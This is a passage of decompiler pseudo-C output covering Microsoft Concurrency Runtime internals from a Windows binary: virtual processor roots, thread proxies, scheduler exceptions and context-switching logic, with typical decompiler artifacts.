__int64 __fastcall sub_13F15B338(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 result; // rax

  *(_QWORD *)a1 = &Concurrency::details::VirtualProcessorRoot::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  sub_13F150F08(a1 + 16, a2, a3, a4);
  *(_WORD *)(a1 + 112) = 0;
  *(_DWORD *)(a1 + 120) = 0;
  *(_DWORD *)(a1 + 116) = _InterlockedIncrement(&dword_13F1C5ED4);
  result = a1;
  *(_QWORD *)(a1 + 64) = a1;
  return result;
}
// 13F18C3E0: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';
// 13F1C5ED4: using guessed type int dword_13F1C5ED4;

//----- (000000013F15B390) ----------------------------------------------------
_QWORD *__fastcall sub_13F15B390(_QWORD *a1, char a2)
{
  *a1 = &Concurrency::details::VirtualProcessorRoot::`vftable';
  a1[2] = &Concurrency::details::ExecutionResource::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 128i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18B020: using guessed type void *Concurrency::details::ExecutionResource::`vftable';
// 13F18C3E0: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';

//----- (000000013F15B3C8) ----------------------------------------------------
__int64 __fastcall sub_13F15B3C8(__int64 a1)
{
  return sub_13F143A38(*(_QWORD *)(*(_QWORD *)(a1 + 48) + 24i64), *(_DWORD *)(a1 + 80), *(_DWORD *)(a1 + 84));
}

//----- (000000013F15B3D4) ----------------------------------------------------
__int64 __fastcall sub_13F15B3D4(__int64 a1)
{
  return *(unsigned int *)(a1 + 88);
}

//----- (000000013F15B3D8) ----------------------------------------------------
__int64 __fastcall sub_13F15B3D8(__int64 a1)
{
  return *(unsigned int *)(a1 + 116);
}

//----- (000000013F15B3DC) ----------------------------------------------------
__int64 __fastcall sub_13F15B3DC(__int64 a1)
{
  return *(unsigned int *)(a1 + 80);
}

//----- (000000013F15B3E0) ----------------------------------------------------
__int64 __fastcall sub_13F15B3E0(__int64 a1, __int64 a2)
{
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pScheduler");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( *(_QWORD *)(*(_QWORD *)(a1 + 48) + 16i64) != a2 )
  {
    sub_13F143088(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  sub_13F15B450(a1);
  return sub_13F15252C(*(_QWORD *)(a1 + 48), a1);
}
// 13F15B3E0: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F15B450) ----------------------------------------------------
__int64 __fastcall sub_13F15B450(__int64 a1)
{
  __int64 result; // rax

  result = (unsigned int)_InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 120), 0xFFFFFFFF);
  if ( (_DWORD)result == 1 )
    return sub_13F152304(*(_QWORD *)(a1 + 48), a1 + 16);
  return result;
}

//----- (000000013F15B474) ----------------------------------------------------
__int64 __fastcall sub_13F15B474(__int64 a1)
{
  return sub_13F152B08(*(_QWORD *)(a1 + 48), a1 + 16);
}

//----- (000000013F15B484) ----------------------------------------------------
__int64 __fastcall sub_13F15B484(__int64 a1)
{
  return sub_13F152304(*(_QWORD *)(a1 + 48), a1 + 16);
}

//----- (000000013F15B494) ----------------------------------------------------
_QWORD *__fastcall sub_13F15B494(_QWORD *a1, __int64 a2, __int64 a3, unsigned int a4)
{
  _QWORD *result; // rax

  sub_13F15B338((__int64)a1, a2, a3, a4);
  *a1 = off_13F18C438;
  result = a1;
  a1[16] = 0i64;
  a1[17] = 0i64;
  return result;
}
// 13F18C438: using guessed type __int64 (__fastcall *off_13F18C438[10])();

//----- (000000013F15B4CC) ----------------------------------------------------
_QWORD *__fastcall sub_13F15B4CC(_QWORD *a1, char a2)
{
  *a1 = &Concurrency::details::VirtualProcessorRoot::`vftable';
  a1[2] = &Concurrency::details::ExecutionResource::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 144i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18B020: using guessed type void *Concurrency::details::ExecutionResource::`vftable';
// 13F18C3E0: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';

//----- (000000013F15B504) ----------------------------------------------------
void __fastcall sub_13F15B504(__int64 a1, __int64 a2)
{
  __int64 v4; // rsi
  char v5[8]; // [rsp+20h] [rbp-58h] BYREF
  int v6; // [rsp+28h] [rbp-50h]
  __int64 (__fastcall *v7)(); // [rsp+30h] [rbp-48h]
  __int64 pExceptionObject[3]; // [rsp+38h] [rbp-40h] BYREF
  __int64 v9[4]; // [rsp+50h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pContext");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 16i64))(a2);
  if ( !v4 )
    v4 = (*(__int64 (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 48) + 56i64))(*(_QWORD *)(a1 + 48), a2);
  if ( _InterlockedIncrement((volatile signed __int32 *)(a1 + 120)) == 2 )
  {
    _InterlockedExchange64((volatile __int64 *)(a1 + 8), a2);
  }
  else
  {
    v6 = 0;
    v7 = sub_13F142C2C;
    while ( *(_QWORD *)(a1 + 128) && !*(_QWORD *)(a1 + 136) )
      sub_13F141BF4((__int64)v5);
    if ( *(_QWORD *)(a1 + 128) )
    {
      if ( v4 != *(_QWORD *)(a1 + 128) )
      {
        sub_13F143088(v9);
        CxxThrowException(v9, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
      }
    }
    *(_QWORD *)(a1 + 136) = 0i64;
    sub_13F15B474(a1);
    sub_13F15B62C(a1, v4);
    sub_13F15BE08();
  }
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15B504: using guessed type char var_58[8];
// 13F15B504: using guessed type _QWORD pExceptionObject[3];
// 13F15B504: using guessed type _QWORD var_28[4];

//----- (000000013F15B62C) ----------------------------------------------------
__int64 __fastcall sub_13F15B62C(__int64 a1, __int64 a2)
{
  __int64 v4; // rdi
  __int64 v5; // rcx
  __int64 v6; // rax
  unsigned __int16 v7; // dx
  __int64 v8; // r8
  __int64 result; // rax
  __int128 v11; // [rsp+20h] [rbp-28h]
  __int128 v12; // [rsp+30h] [rbp-18h] BYREF

  sub_13F15BE20(a2);
  *(_QWORD *)(a1 + 128) = a2;
  *(_QWORD *)(a2 + 32) = a1;
  v4 = *(_QWORD *)(a1 + 48);
  v5 = (**(unsigned int (__fastcall ***)(__int64))a1)(a1);
  v6 = *(_QWORD *)(v4 + 32);
  v5 <<= 6;
  v7 = *(_WORD *)(v5 + v6 + 16);
  v8 = *(_QWORD *)(v5 + v6);
  *((_QWORD *)&v11 + 1) = v7;
  *(_QWORD *)&v11 = v8;
  v12 = v11;
  if ( v7 != *(_WORD *)(a2 + 80) || v8 != *(_QWORD *)(a2 + 72) )
    sub_13F143410(&v12, *(_QWORD *)(a2 + 16));
  *(_WORD *)(a2 + 80) = WORD4(v12);
  result = v12;
  *(_QWORD *)(a2 + 72) = v12;
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15B6DC) ----------------------------------------------------
char __fastcall sub_13F15B6DC(__int64 a1, __int64 a2)
{
  __int64 v3; // rdi
  char v5[8]; // [rsp+20h] [rbp-68h] BYREF
  int v6; // [rsp+28h] [rbp-60h]
  __int64 (__fastcall *v7)(); // [rsp+30h] [rbp-58h]
  __int64 pExceptionObject[3]; // [rsp+38h] [rbp-50h] BYREF
  __int64 v9[3]; // [rsp+50h] [rbp-38h] BYREF
  __int64 v10[4]; // [rsp+68h] [rbp-20h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pContext");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !*(_QWORD *)(a1 + 128) )
  {
    sub_13F143088(v9);
    CxxThrowException(v9, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  v3 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 16i64))(a2);
  if ( *(_QWORD *)(a1 + 128) != v3 )
  {
    sub_13F143088(v10);
    CxxThrowException(v10, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 120), 0xFFFFFFFF) == 1 )
  {
    _InterlockedExchange64((volatile __int64 *)(a1 + 136), *(_QWORD *)(a1 + 128));
    sub_13F15B484(a1);
    sub_13F15BE58(v3);
  }
  else
  {
    v6 = 0;
    v7 = sub_13F142C2C;
    while ( !*(_QWORD *)(a1 + 8) )
      sub_13F141BF4((__int64)v5);
    *(_QWORD *)(a1 + 8) = 0i64;
  }
  return 1;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15B6DC: using guessed type char var_68[8];
// 13F15B6DC: using guessed type _QWORD pExceptionObject[3];
// 13F15B6DC: using guessed type _QWORD var_38[3];
// 13F15B6DC: using guessed type _QWORD var_20[4];

//----- (000000013F15B7F8) ----------------------------------------------------
__int64 __fastcall sub_13F15B7F8(_QWORD *a1)
{
  __int64 v2; // rax
  unsigned __int64 v3; // r8
  char v5[8]; // [rsp+20h] [rbp-28h] BYREF
  int v6; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v7)(); // [rsp+30h] [rbp-18h]

  v2 = sub_13F142818(*(unsigned int *)(*(_QWORD *)(a1[6] + 24i64) + 176i64));
  if ( v2 && (v2 & 3) == 1 && (v3 = v2 & 0xFFFFFFFFFFFFFFFEui64, (v2 & 0xFFFFFFFFFFFFFFFEui64) != 0) && v3 == a1[16] )
  {
    *(_QWORD *)(v3 + 32) = 0i64;
  }
  else
  {
    v6 = 0;
    v7 = sub_13F142C2C;
    while ( a1[16] && !a1[17] )
      sub_13F141BF4((__int64)v5);
  }
  return (*(__int64 (__fastcall **)(_QWORD *, __int64))(*a1 + 64i64))(a1, 1i64);
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15B7F8: using guessed type char var_28[8];

//----- (000000013F15B890) ----------------------------------------------------
__int64 __fastcall sub_13F15B890(__int64 a1, __int64 a2)
{
  __int64 pExceptionObject[3]; // [rsp+20h] [rbp-58h] BYREF
  __int64 v5[3]; // [rsp+38h] [rbp-40h] BYREF
  __int64 v6[5]; // [rsp+50h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pContext");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !*(_QWORD *)(a1 + 128) )
  {
    sub_13F143088(v5);
    CxxThrowException(v5, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  if ( *(_QWORD *)(a1 + 128) != (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 16i64))(a2) )
  {
    sub_13F143088(v6);
    CxxThrowException(v6, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  return sub_13F145170(*(_QWORD *)(*(_QWORD *)(a1 + 48) + 24i64));
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15B890: using guessed type _QWORD pExceptionObject[3];
// 13F15B890: using guessed type _QWORD var_40[3];
// 13F15B890: using guessed type _QWORD var_28[5];

//----- (000000013F15B934) ----------------------------------------------------
__int64 __fastcall sub_13F15B934(__int64 a1, unsigned int a2)
{
  __int64 v2; // rdi
  signed __int32 v5; // eax
  bool v6; // cc
  __int64 result; // rax
  __int64 i; // rax
  __int64 v9; // rsi
  char v10[8]; // [rsp+20h] [rbp-28h] BYREF
  int v11; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v12)(); // [rsp+30h] [rbp-18h]

  v2 = *(_QWORD *)(a1 + 128);
  v5 = _InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 120), 0xFFFFFFFF);
  v6 = v5 <= 1;
  result = (unsigned int)(v5 - 1);
  if ( v6 )
  {
    if ( !(_DWORD)result )
      result = sub_13F15B484(a1);
    *(_QWORD *)(a1 + 128) = 0i64;
    if ( a2 == 1 )
      return sub_13F15BE58(v2);
  }
  else
  {
    v11 = 0;
    v12 = sub_13F142C2C;
    for ( i = *(_QWORD *)(a1 + 8); !i; i = *(_QWORD *)(a1 + 8) )
      sub_13F141BF4((__int64)v10);
    v9 = *(_QWORD *)(a1 + 8);
    *(_QWORD *)(a1 + 8) = 0i64;
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 16i64))(v9);
    if ( v2 != result )
      return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v2 + 8i64))(v2, v9, a2);
  }
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15B934: using guessed type char var_28[8];

//----- (000000013F15B9FC) ----------------------------------------------------
__int64 __fastcall sub_13F15B9FC(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 112) = a2;
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a2 + 24i64))(a2, a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15BA18) ----------------------------------------------------
__int64 __fastcall sub_13F15BA18(__int64 a1)
{
  int v2; // eax
  __int64 v3; // rcx
  __int64 v4; // rbx
  __int64 result; // rax
  int v6; // [rsp+30h] [rbp+8h] BYREF
  int v7; // [rsp+34h] [rbp+Ch]

  v7 = 0;
  v2 = *(_DWORD *)(a1 + 56);
  v6 = 8;
  if ( !v2 )
  {
    (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 32i64))(*(_QWORD *)(a1 + 8));
    sub_13F142820();
  }
  while ( 1 )
  {
    result = *(unsigned int *)(a1 + 56);
    if ( (_DWORD)result )
      break;
    (*(void (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 112) + 24i64))(*(_QWORD *)(a1 + 112), a1);
    (*(void (__fastcall **)(_QWORD, int *))(**(_QWORD **)(a1 + 112) + 32i64))(*(_QWORD *)(a1 + 112), &v6);
    v3 = *(_QWORD *)(a1 + 8);
    v4 = *(_QWORD *)(a1 + 32);
    *(_QWORD *)(a1 + 32) = 0i64;
    *(_QWORD *)(a1 + 112) = 0i64;
    (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v3 + 8i64))(v3, a1);
    if ( v4 )
      sub_13F15B934(v4, 1u);
    else
      sub_13F15BE58(a1);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15BADC) ----------------------------------------------------
__int64 __fastcall sub_13F15BADC(__int64 a1)
{
  *(_QWORD *)(a1 + 112) = 0i64;
  return (*(__int64 (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 8) + 8i64))(*(_QWORD *)(a1 + 8), a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15BAF8) ----------------------------------------------------
__int64 __fastcall sub_13F15BAF8(__int64 a1, unsigned int a2)
{
  __int64 v2; // rax
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a2 )
    goto LABEL_8;
  v2 = *(_QWORD *)(a1 + 32);
  if ( !v2 )
  {
    if ( a2 == 1 )
      return sub_13F15BE58(a1);
LABEL_8:
    sub_13F1097A8(pExceptionObject, (__int64)"switchState");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( a2 == 2 )
    *(_QWORD *)(a1 + 32) = 0i64;
  return sub_13F15B934(v2, a2);
}
// 13F15BAF8: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F15BB50) ----------------------------------------------------
void __fastcall sub_13F15BB50(__int64 a1, __int64 a2, int a3)
{
  __int64 v6; // r14
  __int64 v7; // rcx
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pContext");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 16i64))(a2);
  if ( !v6 )
    v6 = (*(__int64 (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(*(_QWORD *)(a1 + 32) + 48i64) + 56i64))(
           *(_QWORD *)(*(_QWORD *)(a1 + 32) + 48i64),
           a2);
  v7 = *(_QWORD *)(a1 + 32);
  *(_QWORD *)(a1 + 32) = 0i64;
  if ( a3 == 1 )
    _InterlockedExchange((volatile __int32 *)(a1 + 52), 1);
  sub_13F15B62C(v7, v6);
  if ( a3 && a3 == 1 )
  {
    sub_13F1427B4(*(_QWORD *)(v6 + 24), *(_QWORD *)(a1 + 24), 0xFFFFFFFFi64, 1i64);
    _InterlockedExchange((volatile __int32 *)(a1 + 52), 0);
  }
  else
  {
    sub_13F15BE08();
  }
}
// 13F1427B4: using guessed type __int64 __fastcall sub_13F1427B4(_QWORD, _QWORD, _QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15BB50: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F15BC34) ----------------------------------------------------
__int64 __fastcall sub_13F15BC34(__int64 a1, __int64 a2, int a3)
{
  __int64 v4; // rax
  __int64 v5; // rdx
  __int64 v6; // rax
  __int64 v8; // rdx
  __int64 v9; // rcx
  int v10; // eax
  int v11; // edx
  char pExceptionObject[40]; // [rsp+30h] [rbp-28h] BYREF

  *(_DWORD *)(a1 + 44) = 0;
  *(_QWORD *)a1 = &Concurrency::details::ThreadProxy::`vftable';
  *(_QWORD *)(a1 + 8) = a2;
  *(_DWORD *)(a1 + 40) = a3;
  *(_BYTE *)(a1 + 48) = 0;
  *(_DWORD *)(a1 + 52) = 1;
  *(_DWORD *)(a1 + 56) = 0;
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 16i64))(*(_QWORD *)(a1 + 8));
  *(_DWORD *)(a1 + 60) = _InterlockedIncrement(&dword_13F1B71D0);
  v4 = sub_13F1422EC();
  v5 = (unsigned int)(*(_DWORD *)(a1 + 40) << 10);
  *(_QWORD *)(a1 + 24) = v4;
  v6 = sub_13F142980(0i64, v5);
  *(_QWORD *)(a1 + 16) = v6;
  if ( !v6 )
  {
    MEMORY[0x76F91910](*(_QWORD *)(a1 + 24));
    (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 24i64))(*(_QWORD *)(a1 + 8));
    v10 = MEMORY[0x76F91760](v9, v8);
    v11 = (unsigned __int16)v10 | 0x80070000;
    if ( v10 <= 0 )
      v11 = v10;
    sub_13F142E5C((__int64)pExceptionObject, v11);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVscheduler_worker_creation_error_Concurrency__);
  }
  return a1;
}
// 13F15BCE8: variable 'v9' is possibly undefined
// 13F15BCE8: variable 'v8' is possibly undefined
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18C4C8: using guessed type void *Concurrency::details::ThreadProxy::`vftable';
// 13F1B71D0: using guessed type int dword_13F1B71D0;

//----- (000000013F15BD18) ----------------------------------------------------
__int64 __fastcall sub_13F15BD18(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C(a2 + 8, a1 + 8);
  *(_QWORD *)a1 = &Concurrency::scheduler_resource_allocation_error::`vftable';
  *(_DWORD *)(a1 + 24) = *(_DWORD *)(a2 + 24);
  *(_QWORD *)a1 = &Concurrency::scheduler_worker_creation_error::`vftable';
  return a1;
}
// 13F189D40: using guessed type void *Concurrency::scheduler_resource_allocation_error::`vftable';
// 13F189DD0: using guessed type void *Concurrency::scheduler_worker_creation_error::`vftable';

//----- (000000013F15BD70) ----------------------------------------------------
__int64 __fastcall sub_13F15BD70(__int64 a1)
{
  *(_QWORD *)a1 = &Concurrency::details::ThreadProxy::`vftable';
  MEMORY[0x76F91910](*(_QWORD *)(a1 + 24));
  sub_13F1422E4(*(_QWORD *)(a1 + 16));
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 24i64))(*(_QWORD *)(a1 + 8));
}
// 13F1422E4: using guessed type __int64 __fastcall sub_13F1422E4(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18C4C8: using guessed type void *Concurrency::details::ThreadProxy::`vftable';

//----- (000000013F15BDBC) ----------------------------------------------------
__int64 __fastcall sub_13F15BDBC(__int64 a1, char a2)
{
  sub_13F15BD70(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 72i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F15BDF0) ----------------------------------------------------
void __fastcall sub_13F15BDF0(__int64 a1)
{
  *(_DWORD *)(a1 + 56) = 1;
  JUMPOUT(0x76F833A0i64);
}
// 13F15BDFB: control flows out of bounds to 76F833A0

//----- (000000013F15BE04) ----------------------------------------------------
__int64 __fastcall sub_13F15BE04(__int64 a1)
{
  return *(unsigned int *)(a1 + 60);
}

//----- (000000013F15BE08) ----------------------------------------------------
void sub_13F15BE08()
{
  JUMPOUT(0x76F833A0i64);
}
// 13F15BE0C: control flows out of bounds to 76F833A0

//----- (000000013F15BE14) ----------------------------------------------------
__int64 __fastcall sub_13F15BE14(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 44) = a2;
  return sub_13F142770();
}

//----- (000000013F15BE20) ----------------------------------------------------
__int64 __fastcall sub_13F15BE20(__int64 a1)
{
  __int64 result; // rax
  char v3[8]; // [rsp+20h] [rbp-28h] BYREF
  int v4; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v5)(); // [rsp+30h] [rbp-18h]

  result = *(unsigned int *)(a1 + 52);
  if ( !(_DWORD)result )
  {
    v4 = 0;
    v5 = sub_13F142C2C;
    do
    {
      sub_13F141BF4((__int64)v3);
      result = *(unsigned int *)(a1 + 52);
    }
    while ( !(_DWORD)result );
  }
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F15BE20: using guessed type char var_28[8];

//----- (000000013F15BE58) ----------------------------------------------------
__int64 __fastcall sub_13F15BE58(__int64 a1)
{
  _InterlockedExchange((volatile __int32 *)(a1 + 52), 1);
  MEMORY[0x76F91980](*(_QWORD *)(a1 + 24), 0xFFFFFFFFi64, 0i64);
  return (unsigned int)_InterlockedExchange((volatile __int32 *)(a1 + 52), 0);
}

//----- (000000013F15BE84) ----------------------------------------------------
__int64 __fastcall sub_13F15BE84(__int64 a1)
{
  MEMORY[0x76F91980](*(_QWORD *)(a1 + 24), 0xFFFFFFFFi64, 0i64);
  _InterlockedExchange((volatile __int32 *)(a1 + 52), 0);
  (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 40i64))(a1);
  (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 32i64))(a1, 1i64);
  sub_13F1428E4();
  return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15BED8) ----------------------------------------------------
__int64 __fastcall sub_13F15BED8(__int64 a1, int a2, int a3, int a4, __int64 a5)
{
  __int64 result; // rax

  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = a5;
  result = a1;
  *(_DWORD *)a1 = a2 & 0xFFFFFFF;
  *(_DWORD *)(a1 + 4) = a4;
  *(_DWORD *)(a1 + 8) = a3;
  return result;
}

//----- (000000013F15BEFC) ----------------------------------------------------
bool __fastcall sub_13F15BEFC(__int64 a1, _DWORD *a2)
{
  __int64 v3; // r10
  unsigned __int64 v4; // r8
  int v5; // er9
  unsigned __int64 v6; // rcx
  __int64 v7; // rax
  __int64 *i; // rdx
  int v10; // [rsp+10h] [rbp+10h]

  switch ( *a2 & 0xFFFFFFF )
  {
    case 0:
      return 1;
    case 1:
      return *(_DWORD *)(*(_QWORD *)(a1 + 16) + 64i64) == a2[2];
    case 2:
      return *(_DWORD *)(a1 + 8) == a2[2];
  }
  if ( (*a2 & 0xFFFFFFF) != 3 )
    return 0;
  v3 = *(_QWORD *)(a1 + 16);
  v4 = 0xCBF29CE484222325ui64;
  v5 = a2[2];
  v6 = 0i64;
  v10 = v5;
  do
  {
    v7 = *((unsigned __int8 *)&v10 + v6++);
    v4 = 0x100000001B3i64 * (v7 ^ v4);
  }
  while ( v6 < 4 );
  for ( i = *(__int64 **)(*(_QWORD *)(v3 + 40) + 8i64 * (int)(v4 % *(int *)(v3 + 32)));
        i && *((_DWORD *)i + 2) != v5;
        i = (__int64 *)*i )
  {
    ;
  }
  return i != 0i64;
}

//----- (000000013F15BF9C) ----------------------------------------------------
bool __fastcall sub_13F15BF9C(__int64 a1, _DWORD *a2)
{
  switch ( *a2 & 0xFFFFFFF )
  {
    case 0:
      return 1;
    case 1:
      return *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 120i64) + 64i64) == a2[2];
    case 2:
      return *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 120i64) + 68i64) == a2[2];
  }
  if ( (*a2 & 0xFFFFFFF) != 3 )
    return 0;
  return *(_DWORD *)(a1 + 8) == a2[2];
}

//----- (000000013F15BFE4) ----------------------------------------------------
__int64 __fastcall sub_13F15BFE4(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  *(_DWORD *)a1 = 1;
  *(_QWORD *)(a1 + 8) = sub_13F102FD0(a2 + 16);
  result = a1;
  *(_QWORD *)(a1 + 16) = a2;
  return result;
}

//----- (000000013F15C01C) ----------------------------------------------------
__int64 __fastcall sub_13F15C01C(__int64 a1)
{
  char v3; // r8
  __int64 v4; // rax

  if ( (*(_BYTE *)a1 & 0x18) != 0 && !sub_13F15C81C(a1) )
    return 0i64;
  if ( *(_DWORD *)a1 == 2 )
  {
    v3 = 0;
LABEL_8:
    v4 = sub_13F158E98(*(_QWORD *)(a1 + 8), *(_QWORD *)(a1 + 16), v3);
    *(_QWORD *)(a1 + 16) = v4;
    if ( v4 )
    {
      *(_BYTE *)(v4 + 295) |= 1u;
      *(_DWORD *)a1 = 1;
    }
    return *(_QWORD *)(a1 + 16);
  }
  if ( *(_DWORD *)a1 == 4 )
  {
    v3 = 1;
    goto LABEL_8;
  }
  return *(_QWORD *)(a1 + 16);
}

//----- (000000013F15C078) ----------------------------------------------------
void __fastcall sub_13F15C078(__int64 a1, __int64 a2)
{
  char v4; // r9

  if ( *(_DWORD *)a1 == 2 )
  {
    v4 = 0;
    goto LABEL_5;
  }
  if ( *(_DWORD *)a1 == 4 )
  {
    v4 = 1;
LABEL_5:
    sub_13F156F18(a2, *(_QWORD *)(a1 + 8), *(_QWORD *)(a1 + 16), v4);
  }
  *(_QWORD *)(a1 + 16) = a2;
  *(_DWORD *)a1 = 1;
}

//----- (000000013F15C0C0) ----------------------------------------------------
char __fastcall sub_13F15C0C0(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  char v11[24]; // [rsp+20h] [rbp-38h] BYREF
  char v12[32]; // [rsp+38h] [rbp-20h] BYREF

  if ( !a4 )
  {
    if ( *(_DWORD *)(a1 + 20) < 0x65u )
    {
      if ( *(_DWORD *)(a3 + 28) - *(_DWORD *)(a3 + 24) <= 0 )
        v9 = 0i64;
      else
        v9 = sub_13F154C84(a3 + 24);
    }
    else
    {
      if ( *(_DWORD *)(a1 + 20) >= 0x7Fu )
      {
LABEL_16:
        *(_DWORD *)(a1 + 20) = 0;
        return 0;
      }
      v9 = sub_13F15DCE0(a3);
    }
    if ( v9 )
    {
      v10 = sub_13F15BFE4((__int64)v12, v9);
      *(_OWORD *)a2 = *(_OWORD *)v10;
      *(_QWORD *)(a2 + 16) = *(_QWORD *)(v10 + 16);
      ++*(_DWORD *)(a1 + 20);
      return 1;
    }
    goto LABEL_16;
  }
  if ( *(_DWORD *)(a3 + 28) - *(_DWORD *)(a3 + 24) <= 0 )
    v6 = 0i64;
  else
    v6 = sub_13F154C84(a3 + 24);
  if ( v6 )
  {
    v7 = sub_13F15BFE4((__int64)v11, v6);
    *(_OWORD *)a2 = *(_OWORD *)v7;
    *(_QWORD *)(a2 + 16) = *(_QWORD *)(v7 + 16);
    return 1;
  }
